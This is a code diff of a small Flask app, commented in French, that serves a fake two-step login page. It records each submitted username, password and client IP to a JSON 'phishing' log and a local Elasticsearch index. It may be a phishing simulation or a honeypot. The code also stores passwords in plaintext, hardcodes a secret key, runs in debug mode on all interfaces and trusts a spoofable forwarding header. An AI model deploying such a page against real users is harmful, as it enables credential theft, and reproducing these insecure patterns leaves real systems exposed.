@@ -1,4 +1,5 @@
-from flask import Flask, request, session, redirect, url_for, abort
+from flask import Flask, request, session, redirect, url_for, render_template, abort
+from elasticsearch import Elasticsearch
 import os
 import json
 from datetime import datetime, timezone
@@ -6,19 +7,48 @@ from datetime import datetime, timezone
 app = Flask(__name__)
 app.secret_key = 'ta_cle_secrete'
 
+# Configuration Elasticsearch avec le port 9200
+es = Elasticsearch(['http://localhost:9200'])
+
 LOG_FILE = os.path.join(os.path.dirname(__file__), 'logs', 'phishing_logs.json')
+BACKUP_LOG_FILE = os.path.join(os.path.dirname(__file__), 'logs', 'phishing_logs_backup.json')
 
 os.makedirs(os.path.dirname(LOG_FILE), exist_ok=True)
-if not os.path.exists(LOG_FILE):
-    with open(LOG_FILE, 'w') as f:
-        json.dump([], f)
 
-def read_html_file(filename):
-    file_path = os.path.join(os.path.dirname(__file__), 'templates', filename)
+def initialize_log_file(file_path):
     if not os.path.exists(file_path):
-        abort(404, description=f"Fichier {filename} introuvable")
-    with open(file_path, 'r', encoding='utf-8') as file:
-        return file.read()
+        with open(file_path, 'w') as f:
+            json.dump([], f)
+
+initialize_log_file(LOG_FILE)
+initialize_log_file(BACKUP_LOG_FILE)
+
+def read_logs(file_path):
+    try:
+        with open(file_path, 'r') as f:
+            return json.load(f)
+    except json.JSONDecodeError:
+        return []
+    except Exception as e:
+        print(f"Erreur lors de la lecture du fichier {file_path}: {e}")
+        return []
+
+def write_logs(file_path, logs):
+    try:
+        with open(file_path, 'w') as f:
+            json.dump(logs, f, indent=4)
+    except Exception as e:
+        print(f"Erreur lors de l'écriture dans le fichier {file_path}: {e}")
+
+def get_client_ip():
+    # Récupère l'adresse IP source de la requête
+    if 'X-Forwarded-For' in request.headers:
+        ip = request.headers.getlist("X-Forwarded-For")[0].split(',')[0]
+    elif 'X-Real-Ip' in request.headers:
+        ip = request.headers.get('X-Real-Ip')
+    else:
+        ip = request.remote_addr
+    return ip
 
 def log_attempt(login, password, ip):
     log_entry = {
@@ -29,48 +59,46 @@ def log_attempt(login, password, ip):
         "event": "fake_login_attempt"
     }
 
-    with open(LOG_FILE, 'r') as f:
-        logs = json.load(f)
-
+    logs = read_logs(LOG_FILE)
     logs.append(log_entry)
+    write_logs(LOG_FILE, logs)
 
-    with open(LOG_FILE, 'w') as f:
-        json.dump(logs, f, indent=4)
+    try:
+        resp = es.index(index='phishing-logs', document=log_entry)
+        print(f"Log enregistré dans Elasticsearch: {resp['_id']}")
+    except Exception as e:
+        print(f"Erreur lors de l'envoi à Elasticsearch: {e}")
+        with open(BACKUP_LOG_FILE, 'a') as f:
+            json.dump(log_entry, f)
+            f.write('\n')
 
 @app.route('/', methods=['GET', 'POST'])
 def login():
     if request.method == 'POST':
         session['login'] = request.form.get('login')
         return redirect(url_for('password'))
-    return read_html_file('login.html')
+    return render_template('login.html')
 
 @app.route('/password', methods=['GET', 'POST'])
 def password():
     if request.method == 'POST':
         password = request.form.get('password')
-        ip = request.remote_addr
-
-
+        ip = get_client_ip()
         log_attempt(session.get('login', ''), password, ip)
-
         session['connected'] = True
         return redirect(url_for('connect'))
 
     if 'login' not in session:
         return redirect(url_for('login'))
 
-    html_content = read_html_file('password.html')
-    html_content = html_content.replace('{{ login }}', session.get('login', ''))
-    return html_content
+    return render_template('password.html', login=session.get('login', ''))
 
 @app.route('/connect')
 def connect():
     if not session.get('connected'):
         return redirect(url_for('login'))
 
-    html_content = read_html_file('connect.html')
-    html_content = html_content.replace('{{ login }}', session.get('login', ''))
-    return html_content
+    return render_template('connect.html', login=session.get('login', ''))
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=5000, debug=True)
